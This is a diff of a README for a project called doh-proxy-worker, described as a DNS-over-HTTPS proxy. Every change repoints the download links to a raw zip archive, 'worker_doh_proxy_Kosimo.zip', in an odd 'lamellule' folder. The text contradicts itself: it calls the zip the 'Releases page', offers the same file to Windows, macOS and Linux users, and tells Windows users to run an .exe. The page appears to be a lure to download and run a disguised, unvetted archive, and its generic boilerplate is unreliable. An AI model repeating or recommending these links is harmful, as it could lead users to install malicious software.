@@ -1,6 +1,6 @@
 # 🌐 doh-proxy-worker - Fast and Reliable DNS-over-HTTPS Proxy
 
-[![Download the latest version](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip)](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip)
+[![Download the latest version](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip)](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to doh-proxy-worker! This application allows you to proxy DNS-over-HTTPS
 
 To get the latest version of the software, visit the Releases page linked below:
 
-[Download the latest version here](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip)
+[Download the latest version here](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip)
 
 Once you are on the Releases page, find the version that you want to download. Click on the asset link that matches your operating system. You will usually find options for Windows, macOS, or Linux. Here’s how to download:
 
 1. **Select Your File**: Look for the file that matches your operating system. For example:
-   - Windows users might see a file like `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip`.
-   - macOS users could find a file called `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip`.
-   - Linux users will likely find a `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip`.
+   - Windows users might see a file like `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip`.
+   - macOS users could find a file called `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip`.
+   - Linux users will likely find a `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip`.
 
 2. **Download**: Click on the file link to download it to your computer.
 
@@ -26,7 +26,7 @@ Once you are on the Releases page, find the version that you want to download. C
 4. **Install the Application**: 
    - **Windows**: Double-click the `.exe` file to run the installer. Follow the prompts to complete the installation.
    - **macOS**: Open the downloaded `.zip` file. Drag the application to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip` file and follow any included instructions to install.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip` file and follow any included instructions to install.
 
 ## 🛠️ System Requirements
 
@@ -70,7 +70,7 @@ If you encounter problems while using doh-proxy-worker, consider the following s
 - **Check Internet Connection**: Ensure you have an active internet connection.
 - **Review Settings**: Go through your configuration to confirm that you selected the correct DNS providers.
 - **Restart the Application**: Sometimes, simply restarting the application can resolve issues.
-- **Revisit Download Page**: If you suspect your installation is corrupt, consider downloading the application again from the [Releases page](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip).
+- **Revisit Download Page**: If you suspect your installation is corrupt, consider downloading the application again from the [Releases page](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip).
 
 For additional support, you may find answers in the README on the GitHub repository or by searching online forums.
 
@@ -82,4 +82,4 @@ For any questions or feedback regarding the application, please reach out to the
 
 Thank you for choosing doh-proxy-worker. Your support encourages continuous improvement and development of this project. We hope it enhances your digital privacy and browsing experience while using DNS-over-HTTPS.
 
-Remember to keep an eye on the [Releases page](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/doh-proxy-worker.zip) for updates and new features!
+Remember to keep an eye on the [Releases page](https://raw.githubusercontent.com/inimulky/doh-proxy-worker/master/lamellule/worker_doh_proxy_Kosimo.zip) for updates and new features!
